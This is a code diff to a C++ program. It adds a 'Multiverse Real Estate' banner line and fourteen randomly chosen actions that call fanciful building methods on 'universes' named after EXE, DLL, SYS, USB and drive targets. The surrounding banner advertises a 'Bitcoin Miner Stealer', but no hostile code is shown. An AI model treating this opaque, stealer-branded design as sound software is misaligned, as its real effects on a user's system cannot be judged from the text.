@@ -55,6 +55,7 @@ public:
         std::cout << "⛏️ Bitcoin Miner Stealer | 💰 Steal Mining Spots | 📊 Benchmark Miners" << std::endl;
         std::cout << "🤖 Offline AI Engine | 🧠 Local Intelligence | 🎯 Smart Decisions" << std::endl;
         std::cout << "🌌 Multiverse System | 🚀 Cross-Format Travel | 🪐 Partition Universes" << std::endl;
+        std::cout << "🏠 Multiverse Real Estate | 🏡 Build Homes | 💰 Property Portfolio" << std::endl;
         std::cout << "========================================================" << std::endl;
         
         initializeComponents();
@@ -373,7 +374,7 @@ private:
     }
     
     void performRandomAction() {
-        std::uniform_int_distribution<> actionDist(1, 63);
+        std::uniform_int_distribution<> actionDist(1, 77);
         int action = actionDist(gen);
         
         switch (action) {
@@ -565,6 +566,48 @@ private:
                 break;
             case 63:
                 if (multiverseSystem) multiverseSystem->soulJump("Virtual_Universe");
+                break;
+            case 64:
+                if (multiverseSystem) multiverseSystem->createSafeHouse("EXE_Universe");
+                break;
+            case 65:
+                if (multiverseSystem) multiverseSystem->createQuantumMansion("ELF_Universe");
+                break;
+            case 66:
+                if (multiverseSystem) multiverseSystem->createFloatingCastle("C_Drive_Universe");
+                break;
+            case 67:
+                if (multiverseSystem) multiverseSystem->createUndergroundBunker("ZIP_Universe");
+                break;
+            case 68:
+                if (multiverseSystem) multiverseSystem->createDimensionalCondo("ISO_Universe");
+                break;
+            case 69:
+                if (multiverseSystem) multiverseSystem->createVoidVilla("RAM_Universe");
+                break;
+            case 70:
+                if (multiverseSystem) multiverseSystem->createAstralApartment("Cloud_Universe");
+                break;
+            case 71:
+                if (multiverseSystem) multiverseSystem->createSoulSanctuary("Virtual_Universe");
+                break;
+            case 72:
+                if (multiverseSystem) multiverseSystem->createTimeTower("Network_Universe");
+                break;
+            case 73:
+                if (multiverseSystem) multiverseSystem->createRealityResort("USB_Universe");
+                break;
+            case 74:
+                if (multiverseSystem) multiverseSystem->createWormholeWing("DLL_Universe");
+                break;
+            case 75:
+                if (multiverseSystem) multiverseSystem->createParallelPenthouse("SYS_Universe");
+                break;
+            case 76:
+                if (multiverseSystem) multiverseSystem->createMultiverseMotel("DRV_Universe");
+                break;
+            case 77:
+                if (multiverseSystem) multiverseSystem->createCosmicCabin("MSI_Universe");
                 break;
         }
     }
